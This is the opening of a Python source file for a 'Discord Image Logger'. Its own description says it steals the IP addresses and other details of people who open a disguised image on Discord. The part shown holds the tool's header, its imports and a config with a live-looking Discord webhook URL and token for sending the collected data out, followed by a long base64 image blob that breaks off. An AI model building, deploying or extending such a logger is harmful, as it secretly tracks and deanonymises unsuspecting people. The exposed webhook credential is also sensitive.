# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "ZERO"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1473931024944730285/zyouutfaUBYOTIr11L6mVeUTwl4tCLXD9pmwbqpkZfm9xTeO0OhQhvvdErmqXQ0TNCqL",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3N//AABEIAJQBDgMBEQACEQEDEQH/xAAcAAABBQEBAQAAAAAAAAAAAAAFAgMEBgcBAAj/xABHEAABAwMDAgQDBQUEBwcFAAABAgMEAAURBhIhMUEHEyJRYXGBFBUykaEjQmKxwTNSgvAIcpKiwtHhFiQ0NUOy8RclRFNk/8QAGwEAAgMBAQEAAAAAAAAAAAAAAwQAAQIFBgf/xAA5EQACAgEDAgQEAwYGAgMAAAABAgADEQQSITFBBRMiUTJhcYEUI5EGM6HB0fAVQlKx4fFDYhYkNP/aAAwDAQACEQMRAD8AxDaaLiVPYqYknM4rOZIZtsppEbYohKh+tCZSTmbBg+Zh2QS2Mj4URRxMmMqaUgZUKuVE7fiK3tkk+Gh9wbWkZB6k0NhzLkxuF5av2zqTnsmoZIbsGlVagVIdbAEaKAuS+tXpbR3PxwATiqzIYBet0QqJjvnaSdpI6jscVeZUjvxZDCCEArbHO5NXmSR05SO/NXJJdrtr1zlJYYCdx7q6D41oGZJxJWotMzrGlhySUOMvcJdR0z7H41oSBsyJZbNLu8gsxQn0jKlHoKkouF5j9609Os6kiThQUMpUnoaglCwNGrVZJVz3llQShHBUehPsKuWWAka429+BKLD45xuCh0IrJlgg8yLjFQTU6KuVOhJ5q5JMYSQkDinqekWc8x7FHg4pDal/hFQnEudLSgcEc1jfLxOKQR1FZLy9sYUfjQyxkE61KcZV+zUU8Vg8zeIhThUdyjlR6miA4kxFDkUQTJnsVJU9UknqkkjpbKsjFcrMbiXGVJGTUzmSMHrWTJPcdqqXJsJncQrdx7VeZIuSeCkfrViUY7b7b5qPPkEhrPCe6/8ApWmbtJJr0gNpwjahsfujpQ5UXbhbJPmrn3NMRptOQEoLi1k9kiqzLlrtviNbrNEVAtlmQ7FW0WnjJkhtTqSMH0tjaFH+9kq+NVLglu1266RX5VlekMFtBX9jktlRx/AtIwv6gGpkSYkWFZr64f2FpuR+JirA/UVW4SsRczRWoVMqeasU5AH4keV+oq/MUdZMSDBM3TkxLlygS46T6VB1lSP51rcp6GURCerNTxr3Ai2+IlWxtfmLUoYycEf1oijEHjmRtKXdixyXVvIUtpxICtnVOOhFaMp13R3WGqYt58luI2oNtZOVjBUTUEpK9sg6ZvbNtS4zJQ4W1K3Baedpq5plzI2oZzd0nBxpKkNpTtTu6n41UiAgYgzyAcY5qTWZNs9tbm3FmM4soStWCR1q+ZRbia1pfQ+n1odkKihbzPRDqtySMexoF7MJSHcOZW/Eq0223PMOQY7cdbifU22kAD6D5GmdHYSOZixQOkpPXkY/OugGzBGTrW63u2ujp0oNrGaUCSZXlEhRxnPHxrAziaGMyE+hbziW0YyTVA4m2GeBFu2Z5LKnQvKEnBrHmSxWcQU60pp3Yr6H3rasDKIxEEHsKsnEgi0qG3nsM0RXEyVhCFaLpP2/YrbNfCvwluOog/XGKy9yDvIKzI0qM9EkOR5LZaeaO1aFdUn2raMCMyipEaxW5mNNubVZrkkRuLdcStBGaoSSEsc1ck5tqYkkuM+EDBTwB1qYkzLVb9MRGo6LhqiS7FacTuahsAee4n3Ofwg/In4Uu2oOdtYyYUV55MMMai08y61Gt+j4T/IQgz3lvn4cHP6AUMJex5bErK9oSevL7KCiNpfTbD2PwsW8bk/MngfWttpXzkv/AA/5lLYueRCNqa1I7EcnBi1zWAMrhx0MIdQB1IKU9fgQaDZQcYBMbU1NxjEsOnYN7vkJufb7pbm4y84CojvmoPsoBwAH3/rS/wCGVurt+o/pMu2w4KiOSLXqaE6t+46ka+zIUVhqKwUFaB2USTt7ULUYrUKhO4/OUp3HpB8y63jaoQ9StqOP/DoQAE/BLhBJ+ZP5V0KdENoDkn7n+sBY3PplVud+uIaKHZ09qSlXrBkrB/LOKa/B6fHw5+5i3m2Ayqva31RbZy2l3Z2U0Ff2cpKXUrSffIoR0lfQDH0h1c4yYxdIsG72l2+WdhEN9ggToKD6UgnhxA7JyQCO3y6StnRtj/aRgCMiVtTyyMdvlTcxiIyTUknskdearMk0Xwm0Pa9Zrmm5z5Laoqk5jxyE70nuSQeM8dKwznMmJa/Fzw9tVl0i3P07CDK4roMhW5S1OIPGSVE9DishpeIS0F4R2xi3Mz9QrVMluoS4hLL60Nsg8jBSQVH49Ksucytolyk6KsDqUoP2pnac/spzqCT8Tu5rJYnrIEA6QVcPCzTFyXveduDjnZRnLXj8ya2lhXpLKgyo6J8LLNdYtwVd5Msy405yOUMuBHlpTjbnIOSQQrPxFGbUvniYFaw8vwS01yW5t3Qf4Xm/6orH4h+8nliNueCVkWCBeLt/iU0f+CtDUsO0nliPwPBnT0dLanZdxdkIzlxLoSFde2PasG9jNBAJMd8KbIuOthM25JSo5JDiCf8A2VjeZscQVI8EbK4tLibpcVFJGEOFspIzyDhIPNX5rTJAMkal8MNGQbLOnt2x1lTDC3AW5buNwHHBUarexkwJhukbeL9qW2W8oK/OeTvA/ujk5rTMQJagd59VXaUzZLJKmEBDUVhShjtgcUEnAzN1obHCjvMBTpGNNZcflyXVznyXFuhQ271cnj25pEeKuj47Tvf4HUU6nMob6Ps77jKyNzaikke4Nd9Liygzy9lRVyvtB280nmGnd/yq5Ikq5rMk8VGpmTEs3h5amrrqEKmNlcOE0qW+OxSgZAPzOBQb7CqHE2igtEXO6u3i5zLg4SfMc2NJH7qR7VKl2IB3kY7jLHbra5bJDMWMlK7qtkvyn+0RrbnaD2PuevaiKMHmV2wI5c5BgMNIbBLrh9Slc9enFGVTYeOk1tFY3GEmIEyBEi3aBJLEkpCsoGCPh8R86JdoygJBkrv8w4h/R8vUbs15q3OMth8IkST5GRvJKeBnjITk15/UF1PoGZ01WjbutllvouMqyTY89pQcJRhRQAFJz6hxx7ViipnuU2jBi1hrHwHiU8WSY3NLsdwLbyNqeOPgckYHxGa9fXSmwCcu12DRN5shuV3YiOYbcdwjek8HgkH/AD7H3rnv6GKmMNXvUOJlup4EiHcjHkIIkIJbcA7qSccfOqJgwMcQ3o+yXFguuTYy2oU5hcfCxgqyng4/OlNRYuBg8w6IcZlWRDC2Ur3HJTmmd3MX3cyL0POOK3NTij8qkkvvhTf02HVFufWrbGlH7HJ9hk+hR+v86W6Ngx21Q1CWL9D/ACn0ldoLV0tcqBKTlqQ0ptWRngj2+FaikC+HC3ho6DFlDEiAXILgHYsrU2P0SD9akkrGrvCuRqDUMq6MakkQW3yk/Z0NqUEkJAOPWOuM/Wq9U2prx6gc/wB/KQWPBVTf9pq+6En/APWnbn/eNXMnHae8JnRatdal063Ieks7A+246cklBCFE/E7k/wCzWV9ofUAZDgYBEuPiHD1LMtTH/ZGUWJ6HwVjeEhTeDnOfjirJxAqATycShIt3jM30nMK/1nWjVBj7TRRR/m/3mgaBl3l61PRdTuNru0R4ofLZSRgjKfw8Zwa1BwN4g27XUm6R3tHT/KjlnDza3EpAUDwRn5/pVE/KbRVPVsfrAdoheLjNzhquEpl2EHkfaAHWslvI3fpmoDKZQOhzNOvVvF1s8y3qXsEhlTe7HTI61czM98MPCxekrm7dLrLZkygktx0sA7UA9VEnuemO3x7WTmSe8fr3936UZtrasOXB7acf3Ecn9Sn9azjJAh6sKjP9h9TMXjazuceIGEpZUUp2pcOdwFCfw+tn3RxPF70r2YEri1qWtS1KypRJJ9zT44GBOWxJOTCNygttDKOPrSynJmQTBm2izUSRWcSR2IwqQ+lpPVR/KoRLm0eHGnIcTRFzltu+dLuDbrSzjAQhBOEjvzjJ+n1Q1dnb2jFSEYYyvQdINi+wWY4dEZ59KlIWAcDG44P071VGr8w7TDWaXaMjpNFt9kas1skMKcS/JmEl95Scb8np8qf6xZVxKrebIFSEYYW4EqyAkdsd/hmmtM/lmXYm8Yk9yPNehftkBCMZHwo92oUrB10FWmi6Zt7FptrLDacLKB5i+6jXn93MOwJ6wu8lp9lxp38Cxg1sGYxjpKJdIzsGSprGQDjPenqr2AwDCGtHGZxDCHVx3VJPmMrC0Hpg1pzu6yguOBIlzssWRqf7wTGcWp9pKlFLW/aocHHtkD9BXO1Js37R0m60GMx26xppXF3s7IralLdKsdkHaB36n270o1TIuT3M0zA+kSnC2Q29zHkNFSU8fCnA7HkRY1iJi+F90vSkvxYrDLCiCHnnMJI74ABJ/L60yrHEGRG9T+Fk6yJS42hM1g9XmUEbT8U5JH51GciQLu4gCPoq7v2ue/HhL+ztIK1rUccjngdzQXuQkER/Sj4qX/zdPrPoPw+vDl90Zabi8SXlsBDpPdaDtUfqU5+tHnP6cGErdETDm3LZ+GS+mTjsklCUkfm3n5qqSSk+IKPEF2+ts6POyB9mSVKJQnDm5WeT8NtZLY7Q1dIddxcD65/kDK+1pDxVmbftmp2mQT6kqfPT/Ck1AWPaa20qcls/b/qEdJ6Ff0dqiBdLpfkSJMxx2MllEc/tSpClnKyrtsJ6ewq5iyzeoHtn+Mvmr7nMs+mbhcbe0h2TGa8xCHAdquec/TNQkKMmZrraxwqjJMxh/wAVdcPHDLFvjf4Af5mgnUJ7zqDwPW59S4+4lq8GL3IvF41C7NdS4++Wn1qSMAnBRx/sURCSMmJ6ytK7NqdJYvEzU120xa4kmzRo8hx13y1h/PAxkEcio7hPig9PprdS+ypcmZdJ8TtcSNyFOW+G0pJBIQkkZHzoZ1CduZ0V8D1WfzMKPmZJsni3qW225ECdaG7g+ykIRIUspKsdN2OD8+K351f+oRb/AAzV79vln+X6zVdAT7xeLCm63zym3piytphkYS00OEj4k8qz7Ee1bVgwyIpdU1VhrbqJiPjvefvHWhiNqy1AZDWM8bjyr+n5VqoZyZdnpRV+8zfNGgZzNXmVC4zLWErJ60HpLCxb9sbSyVpUeKoPN7YKdb2ObetbmJPt7HlF10KwUtnv78Vlukhlu0bqpenZHkSQVwHVArSOqCRgkD5Hp8KQtTfO49X5Sj5TRrVDTHuL9wS8l9otbI5SvO0qOTn6AEH2NZqqVDkQJYsu0yfJeyM5yr55ropFyshuLWsjAJI447UR3CrkmUBzIM6Q7uaZaCnAFpK/bbnNcbUa3zDtTp7x2mnHqaWaHekH1HcM9s1gWQTU4h2NPQ8UhGTmjK8XZMSv3BiaxdZLoSp1Di9xaV34wCn44AH9KwmoemwhhkQmwFQVnYzzUgENn1DqlQwRXTGprYZziBIPtGbjMXEVHDcSTKcWooShhJODjv2A+J4oVllQ9RYSKT0grWF1QiELe5MbRMIStxDJz5aT0Tn6dfhSrsbmBA4EyMZmbiG/JmEolrwRzzmmQQF6TIALgN0k/T+stRaEmqTIC59rcVlTLhwU+5Sex/SqqtVuOhjeq0DVL5tXqT39vrNh054k6V1C2lLNyajyDwY0shpWfYZ4V9CaNic6WfyYimFtpS2WnAQoAjBz1rAqQdBNixgQ2eRA5uGmtG2pqIufCt8RkEIaU6MnOScDqSSSeKIBiZJJOZV7d4saeXc7o9cZn2OGhLKYnmNqK3hhRK9qQSOo4PbHyqgQek09bVkBhgkZjc/xt0uySILU+aQOC2xtSfqo5/SrJEyFY9BAUvxsuD//AJXpkjngyHT/AEAoZtRe8bq8O1dvw1n9P6wXbNaXXUOutNrvHktKYmehpr8LaVpUDk55PFUjh2yOkNqtIdNp9lg9eQfoMHiaL4hansB0rebem8QlzXobjbUdp4LcUspwkADnriiEjvOeobPpnzjcLJerfHRIuUGZHZc4S482Qk/WtV2VMcKZuwXYyxOPrNK8AJjUa63H7Q42ygxASpagkDao9z061GHqMuw5rSWnxblR9VaaEXTEpu5yWJCVLTCcDm0c9SOP1obWVoR5hmaxZyUnz4tC0uKbcCw4k4KVA7gfbHvTa7SMjpBsXJw0N2K1Xe6XiBacSm0y3QjKsj09+flmliKGJIxmPHUa2uvaWYLPq5z7PZbMVAJbjw2OOwCUj/pU6CJgF2Anx9eJrt2usqc5krkvKX79TwK0rbVm7PW5xG5FsnRWA9JhSGmldFuNkJP1qluRjhWBMpqbEGWXiRFDniiZg8SUh9aTuHBq8So6q4PKSUqPB7VnYJoNIjjilKzir6TOYQt581mRu7JSAR8TWTJJFydSw8gAex49qUqG7M9F4pYKdqL1wJptncYk26O/bpflnbsUhXKFjGQD8uf1pZiVY5mK2VxwIWYM4kJU3EA7L81R/wB3H9agtsHR4F6sniF4NrlS+VOBLZPqUlOKWsWy8+puJQ2VfWS7jAYiRyhlIwOqj+8aFcU09eRN1F7GlV2vpmbGG/MKjyFdAPjS2luezPtHbkQCXbS0R1DKXJOzd+6EiunUM9Zyb2GeIcmRkSEdgodDRyoPIi6tiDFwo76yZLYLo48xJKVH6jrU8tGGGAM2XPaUnxPuytOWmMzbZLyJsyTtQrIJShIBVyR8Uj61S6Wnn0y6jusVT3mRvyJLf290rUtw4dJWcqUQcEk9+FfpTte1lGIPV1eTeyxmNqGQwrKkZ+FE8oGLhpLe1Ut9O1bAI+NCbShusa02tt0zZrP9PvBrki2SCS7FcbWe7Z4/Ks+TcnwnP1j/AOL8P1HN1e0+6/0iA1acbfPlY9tvWq/P9hK8vwnr5jfpOpkW6Mcx4qnVj9548D6VYptb4zgfKT8V4dRzTWWP/t/Se+9ErAW9Eade7uLP5DFWdMezYEoeLKRueoM/uf6T33zJx+yDTXwQjFaGlTvkyj43qelYVfoBN28IY1un6SYlLZbem71B9biQpW4E4+QxivN+IgrqCvaVZrdTYql3J+8rfiFpyFKu7rFtjJSgqDjyWsD14omm1VlYyZ1tHpatRpcajPJ6jrKjpdy2WPWlvTNihEduRtcddPHTg49s4P0rqOLLKd277CJ3tpqi1VNWD03EzcfEJ6CvRVyEstLQ9HUGNx/Esj0lP1x0rn1bkcHE5tFZezH6z5sDEdltKZrbrik52+XwCK7LNY5/L6Q9C6RK8akEn5e013whdskS1yHo8xpl9w5dYcWAUAdDz1rheI+fv2kZHvD3GmxR5CbR/H7yhawuVvk+Ij02IG1Q96cuJGUrITgqHvz/ACrrUJYNHsPWKKVXVKW6Q/B1WqwTW5ttgN3J1SFBv1ehHTnI79aX0i+Wxaw4+s6/iCWaqtU067vpzj7xjUfiBqq62uWzc1RokN5soDDKfUvPbOad85bG2rEB4bdpK2tvGDjgZ5z9JTNMPMRL5CfmIBjocG/cOB8arUqzVMq9cRXS4WwE9Jq+rp9sGl5in3mHG3WiGkbwd6senHx7157R1WjULgdOs7GpZRUd3SYghGTXq55pVzGq1MT1SSdHWqzLhOMy9GY3OoUjzSAgK4yOecUPepziMHTWqFZ1IBPEbnK3ylc9ABWaxhYbxB91/wBABDGjrom33BUeQQIkzCF5/dV2P64+vwrGor3rx1EHpLzVZ9Zab4i8WZSZNvdWWuqm/wAScf59qTrKnhp2G55El2nxJcQhLcxlST7o9STVtSf8pgygbqJcJ91Ee1mdclKQNu4oI9Qz2x7/AArzdxs1eo8pOcQ6KqDIiYAdRbhd1RHRHca88ucZCMZz+Vd2nRmpQoEQt1Cs+MwtdL+mwW5Mycy+GtwSClvPXpTIrYCBUCxsL1lcuHitHjEBuFIWSOCcJ4qwp94c6NgIvTWq7vqqeQxERGioxlwnJPv8Ky2RwOsp6ErX1SmeIk8XjU7SmVBcSAnyG1A53KzlZ/Pj6VtrMLtPWPeH6BmddQR6cyuTfSuYn+/HUP0z/SmNL+7EU8eXbrm+glaI5p0TizlSSexVZklg0Rpl3VV/i21LhaQ7kuOYyUJAyTj8h9ayzYkxNvt3gjpeMlP2tUyWodVLd2g/QVjcZeIZZ8LNFNp2/czS/itxRP8AOqzJG5Ph3oCKUJk2yEyV52hx8pKsdcZVz1FSSSrdobTDO520JWzn0qXElqH0JB+P60J6Uf4hmGTUOowDKRrhu0aVvDUOP+wD0fzFKcWSXFbjnJNc/WaYnGwTveGa1Qh80iFfCJ6DcZt2lMoacW15QDm0EpPqzg0zpEZEIaIeK2pY6shkvxLsMnUt7sttivNtDY664tzsgFIOB3PI4ph13GJ02GtS399JK/8ApRpZTCEPx5Dq0J5WXiCo+/FaVQvSCa1m6xl3wd0i5/6EsH4SDVkZlCxh0lL8T/DO16e09962YyApt5IeDqyv0Hj9DirzgTSMWbBmZRVIa9KXVFA6gHANAYhjnE6Fdrqu1XIETPfaWgYznI6ntRKxjiL3MCMmGrG/FKFgqSDjHJ7Uhq63yMTq6K2rHMD3ZoOPDyW8qORlI6CmtNkDmIa3azDEmwNF3+THS81DCUL5HmK2mtNfWDgxRUMqgFMiLRQA71RkhzT0AL3SnUhSUHCAR1NK6q3b6R1npPAPDlvY32Dhen1k65+pURKupdJP5UDTfAxnQ8aXfdp19yYAlJLclxJGCFGnUOVE8prEKahwfeNc9jitReavpa8tSbc3EmrS9tTtDuOuOx/T51zL1w/E7WmclIas+jrQq6t3MhPlsryGR+FTn7pUPYUXT+r4ukzqr2QbQOTA+vXZkqd6YzjsBsekpP4ld1Y/lS9dVNVhesYJjelP5Q3nmSD4hSndPt2JuGywyYoilboUpSk7due3P5035xxiDHhyb927vDN01HctUWY2iNZC8VhI88bglOOhyQM1hryRtAl1aGqhxa7yJb/C5x5Icu85CVK5LbQz+tCCnOSYa3xWoKUpT7mPavv1r0LY12m0Fs3BaCG20/8Ap5/fV8aYrqycmcO69nPMzZhspgtBZyrgkk5Jz3NJO2bCZ9A0tIq0aL7YkOalS5y0JGVKaIH+zXQ0v7vM8j+0HOt+wgdcCS2MKZ6U4HE4hWM/ZHz0ZV9BULiTbEqacR+NCh9KyDIYX01crlBceVZ56oTymylTyVAK2nqAeo+lCtcIM4jei0h1TFQwXHvCDyblP4m6guEoq67nlr5+poBvfss6f+F6JB+ZqBn5TcfBSKIWjlRwpStsxzO7qMhJo1Tl1yROXraaqbAKm3LjOYD8c7QLpIs28LKW0P42n3LdDusdCAsNoKtI4ZtSSMYxiEvAqI3B05cY7e7ieSdw55bRWqXZh6pjX00VupoJKkd5R/8ASO41Jaj/APxn/wB5o69YofgH3hf/AEbARFvhwcFbWDjrwqqPWWf3Y+p/lLhraZ93610jI3kBchTCgDwQ4NnP1UD9KGzEOIemsPQ/uOZaNR21d4sE63NvrYXIZKEOpJBQrseOetEigmVteC1yH9vq2UT/AAbv+dVmbPl9syBrbw7e05pObcH9V3KSlsACO4s+W4ScAHmrlJ1mRIEp9JDbasDqQKohFPMOGssHpEZd3pO1zORzWwB2gH3A4MQHVA8HFXMgkd5YbJOjs4U4pPBGc0Nlz0hg81KLrywGM150xLbgQApJ7Gue+lctCeYJhORXUikkQ45kyENJONx5PsKw7hFLRjTadr7lqHeXVCG24yWmQAhAwBXGsZnbcZ9N09Fen04qrHAgiSormxk/3STTdPFJM81rmNniFKe0HXpAROyP30g/Wj6dspOT47WE1W4dxIB70ecaWXTU5YiOpU4VGLlxttIGUjqT8QcY+Bx2NK6hM4xHdLbjOZdbZcfObRJiSMpCMek44PUH3HwpEq1bTqLclte0iE0XBTgAcTzjrWOkm3HSEmJsIISpTaBsOclIPNbBi9hfPWSZOu7dGadbZfR+xT69nJSPj7UUKx7RYgZ5mZ6g8T7xcSpu1kwmlcFzO5w/0T9KcroCjJij27uBKez5kuWPNWpxSlZcUo5Kj7k963adqRjw+g3ahQeksbisM4HvXJXk5n0KxtteIzCSl3UzCHFBKTjJ/wAJrpU8UzxXjn/7j9BLFJYiZOx9JGO4rKkkTmERcOOwryxva5OKjk4kGIi+af2sLW0WV7TkpFVVbzzLdOJ6z6OekJCihpCPxcmpZqQOJQrJELRrDEhZXJkIUCeAgdKC1xbpNrXtmj+G/kNxblGjL3tokJWCeuFNp/qk0xpiSpk1Qxs+n8zG/E2QmBBhTVoScOqayroNwz/w1NShYDExS2MiD/Byf9uZvZ9I/wC9oVhPbKAP+GtUDAIhNT8KH5H/AHk/xA11bdHSYaJ9sfmOSUKUhTSUHGD0OTnvR4qAW4E94fa8jazfnoj212GmKGz+1I9e7d7f6v61AQZGVl+ISu+Ob6ocjTMtH4m5iiPmACP1AodnSN6Q5bZ75H8DNQkrWYTq45/aFsls/HHFEicxeMPGmcMLleQk91tR0fyRmshs9oZqQp5YR1/w58QL5HUxqDUqHI6+rLjilJznIOBxxVykKKcnmQk2eDp5+RaftLMl6OAHlhOAFEA7efbIrz/iRt83IM9R4QUbT8Ymc6sbY+8SY2NuOcV1dAzmr1zl+LInneiV09TT0409ViSdzitSomsS5ZbLDVCYMl1P7RwYSP7opDU2BvQJ67wXQPp1/E2Dk9JOYe3OEHPNKMuBmdyi/L4kRIDl1VjohH86bPpoHznBT87xZj/pEiX9OVsqHsRV6Vuogv2hrJKH++0E5pyeYMM6YeInKiBwtJloKC4n8SSAVDHvnpt757HBArRkZ9oSpucRyVLftdzXItz26O+S6kKSQCCeQR2OagVbFw015jVtlYbh63Z2f96jOJc92+RS7aPngxpddxgxL9/k3pwQ7ahxtoJKnHsfhAGTgVYoWsZaYfUNYcLA9+lpZaFsj5KGwjz3eMrc25UDj+InOe4x2phFOdxgLG42iBE9cnkdqJAjiFbW2EneqktQ3OJ6fwagVjeesJurBb+tKKMGeitcFMSOl5Ue8KfTklphagAcchs4ro0D8vE8Z42c60n5CN266OuvKL7QVjqK2yYHE5ynPWSJ8/yXGnW2FAA5wKiDIwZbccx13VYLC0eUsKX1OOKz5PMrzCRiEIGum4zGAlalBOPmaE2lyczQuwIMl6smSDhlkAEk+r3oiacDrMm0maL4H6iCZN1RdH2mAttLm5agB6fifga2q7WIhLeaEY+5EmeLmtNMXvTj1mgXFMudvQ42Y6SpAwcn19Ome9Ei46yu+DmqrTpVu7m9zfIafDZQSkqKlJ3ZwB8FCsj4jGLOaEPsT/KN+LXiBatRG3nT63FqjKWlxbrO0EKxjGef3T2rFlK2fFDaPXW6MMaiOflmEf8AR+ur0m93RiQsFRjBYATj8KgP+KqSta29M3rNbfrKg1p6H2x2h3/SEZUdP2mSBjyZvJ9sj/pW2HEU07YcfUQ+nxO0lbrdETLvLKnQygLSylThCtoyDtBxWgciCcYYiAp/jnp9tRRAt9wmKHRQQlCT+Zz+lX9ZQUtwIAl+NmoZQxatOR2MnhUhanf5baGbUXqY3V4fqrfgrMy283OS7cHni6TIWorfcB/GtRyo/risogsXcwhtTYdMwpq/yjB+Z7/p0gxT6lj1kqPuaOFA6RFrCesbSNyqKFg88yUI25I45qTWOJKTBSUjpVGDgtCCtaUpGSo4AoZPE2FLHA7y+EFLCUkZwkJP0rhuwNhn1WpGTTop5wBBiikSQR6D7UdeVxORYQt2ekRax5jsl0jqsAfl/wBRRdUdoVflEfAl8yy249ziR7+raGxj94/yq9IM5mf2hbYFHzgP40/PIR1pwtqSpOQUkEEHoarA7yhxLbcUDUERgRpDC5Lzm6Mxt2OYwAtHTBO7kc80up8snd07w7AvjEFNaYu6pKGHoiowUsJLj/pQnKsde/yHJrQvrK7gYMVtDGPIU1ZLEgJlFTnmOuOcpT+HcvA4OM+nnbnHWhOwUGy08Qygn0oOZXLxapNoeEeVsJKdyFtqylQ6fD+VFovS9N6QdtL1Nh5EaTucCB+dEY4EJp6vMsAhthtSUgAVz3bJnsdPUVUAR8g5CfjQxGiDwJG2hyXMcJwEoCD8yR/y/Wn6zhBPJ+IIb9RbYvRcZiPsqUK8xtah0ou7InMAh2E2282S84jOOiqC2e031jciEwpo7QjOagYysSDHtIeWeUIAohsxMbZ37tYbXteXyKrzCZYXmR1tw3ytlSVrQFBWGxnn59qG5syCs6WkOnCMmqzjOePecfS2yypEaI21xjco5VUVG3ZZpu/XabyzXp6QM9zyYMZmoYKxIjIkZVlO5XQ0aysv8JxFtHrKqFK21h+4z2iJ1x+1oS2I7bSEqyAiqqp2HJOZrWeIDUqEWsKAc8QlpS6XO1vvv2WYIkoo2Fwn9w9f1AqrX8s5MrRaZtWjVKQDweTiO3+6XSczm735c9aVAhkrJAPvWUtLnAELqNBXpU3G1Wb2EhmdBSdyLclSzyS6c81XkWHq8YPiWhXlNNk/MxDl9kJ9LLbLaf4UVf4RO5JmD4/qB+6RV+0jOXac5+KQrHsOK2unrXtFrPF9bZ1sMXHjh1sqUeTkk1h7MHExVUGUknmQ3QEuECmqzkRKwYbEW0BvFM7eIMHmEXVpSwCnrQlBJhmI2xlMwpGDW2SLAx7T0VT0lT+3KGefr2rnal9qcT0HgWlN+p3EcLzLOFbhz1rjnrPoanKwZc0hIKwMEU3puWAnn/GQErLxdpRsho/iJV+f/wAVNWc2SeAV7NGpPU5MgajT/ZfEn+VG0Xec79phjYfnAu3Ap+eSMkMraTFdbVFC3lcod3EbB8uhrBDbgczQK45EsmiWpoSuW0+01EjOhZK0FRChg5GB6eO+e/SldZaqrgjJMZ0iEnOeBLRqFd6uxZEa5RWmx+BSlZO7HXOOOK5tF9WnBypjNmndj6Zn8KZIsc579nuWgltWeOh/r1rr3VLqKwM8RKm7yHJxzE3e6vXeQl11AT5adqQOamn060LtEvUag3tuMiRlhuQFEZ5rdi5GIbQWCuwMZZ4rjbwykc965VilTPf6S2u4ZWJkKS1vdPRI4+J9q3UpcgQGttShGtPQRy0RgWSlaCpbqtygfftRrbvXhe05ug8MW7Qv53Bf1fT2lt0voP8A7SzpDarg3GjRijzUNo3OqyO3YDg889KYQbuk80+2pQSMkyzzPB5tLf8A9pu7qVD92Y0lYP1Tgj9aIa/aBF6H4k/SV6Xoy9WjKrjb/MjpH/iIn7VI+JH4h+VDIZeohlrrs/dtz7Hj/iJZ06h5oOteQ4lXIUk8GsboNq2Q4Ij9s0hHm6ntkKUwlbSlKdfR2U2kf8yKtGBbEIK9tTWf3/eJpeoNN25vSlwhW+AxHSpghIZbAI70dgMRMMSeTMu0h4Zt6mQ7Ll3NTMRt5bKmI4yvKcdVHgZyD071isZGY1qAtQC45Ij998BsAqsd5KiB/ZzEdf8AEkcf7NGyR0ii7e8oV38PLpZc/eyHIg7OKQFtK+SwcfQ4NYNhHWGGn342NmX3SvgjBm2lqZdrw8syG0rbTDASlOeeqgc/kK0DnmBYFTiD9QeBV1jBTliuLE1IyQy+PKcx7A8gn8q1kzMzqfpe+W2YIc23SGpSlbUMlGVLP8OPxfTNZL4hRSzdBL/B8Cb3It7T8i5RI0lacqjLSVeWT2KhwT74/WtZgoh7wG1In+yuVpX/AKy3E/8AAamZIvRPhNJus25R7vdExk26SYzzUYblrOAQoFQwEkHg4/KsFQTCi1lGBDl58A2FjfZb04hXPolthQJ+acY/I1oHEEeZneoPDjVOndzku2qfjp//ACIh81GPfj1D6gUylw6GZIlXUsnj+tMKB1ErJjZz7Vl5JaNMo8uC4CPxOZ/SuBrTkjE95+y1YFDP3JhLGDSE9MfSYNvSgGVDuelOaQeueb/aN8acqO8kxk7GG0dNqAKFccuZ09HXsoVPYCDNQjhj5n+lM6LvPP8A7UfDX9TA+OD0rozyEu+n9HxPsa5l6LiCpILbecDJ7fxHpxnv3rmajWkPsqGTH6dJkbnhNuJAjr8lxaoVmfSULCiE73cjHpHI6dSKC73HkDLCO/8A10p2+5k2fZLnc4KXbcoMuxMtNNY/GnonOOe2N3Tr8wOp0JIsHWZ1K7MeUc8TMpi3Xn1LfSoO52rSoHgjjB9iMV2UTaoA6TkO+8kkcxjBGVbcj3HSrziTYSMx6FGLxW8R6U8D50K2zbxOn4bpDblz0EMwiGkkDvSFvqPM9doitKYEUhP2ubt6ssnk+6qKPyKsnqYnsPiWtFf/AI05PzPtLHp9vzLvGRgetW0Z98HFLU8nJnX8WRvwT7OP6S46GS5ZfEeRCfVhFwjHaP7yk4UnH0C6eobDlZ4rWVbtFVcvYkGWPxUv1905bIc6wBlZL+x5txG7II4x+RplnVBljOZRprdQ22pcmRPDvxMa1TLVa58FcK6JQV7RkoWB1we31q1YEZBg7K2rba4wfnD95ssFt37U0kNOOn1ttgDzD749xQbUAGRDJazDa3MgaIjplXa6XZAIYQr7HHJ7hJ9Svqf5VjTrnLRzXDyakp79T95bGZEefHcLDqXG962VlJzhSSUqHzBBFNTl5xzM+8Kd1uveo7K6vlt4OpB9wSlR/RFL6c9VPadfxZP3Vy9GUfqJ7xV1ZqLSdytztmaZkQ321ea043k7kkZwevIUPyorWKhG49YhTpLtQGNSFsdcf38oQ0DrmDrqPJhvwVMS2EAyIzidyCCcZBP8jzWhgiBIZGweCJcoMSPAiNxYiA2w0MIQOiR7CrmScnJmS6s8RdTaV1fNiuwmZ1qQUqRhGF7CB3Htz2rBsQHaTzGl0WparzVQlfcTQdKX226xs8e7RWTtSs4Q6n1NLHXn+orcVj+rVXlFgkq00hC7mkAsoVtwrnkeogdPjUkmfRHPGZzBcYtbOezykHH+yTUkkvw/l3aPry9w9RKii5SmG3XxGPoKkpSE4/wEZoatlysbupA01doHXOft0k7xX1LqHTBtcqwtsvMOqWmQ26jdyMFOPbjdVs6r8RxB0aW7UEipdxHPEe8OvEaPrFx2BIhrh3JlvzFtHlCk5wSD9Rwa0CD0gmR0O1xg/OU7xw0xaICoV1hMNtSZT5adaQAAv0lW/Hwxj61rcR0MoCZOqIznlIzU8xveXgQxb8MxG9uTkZP1rkahtzmfQvBqxRpFx35k1R9IUOfcUtO2zcZga7KC3UpPc4xT+l4BM8l48fMsRPcyeFcE9O1LEZM7YcKuTLBa/DW86hW2/NcRAh9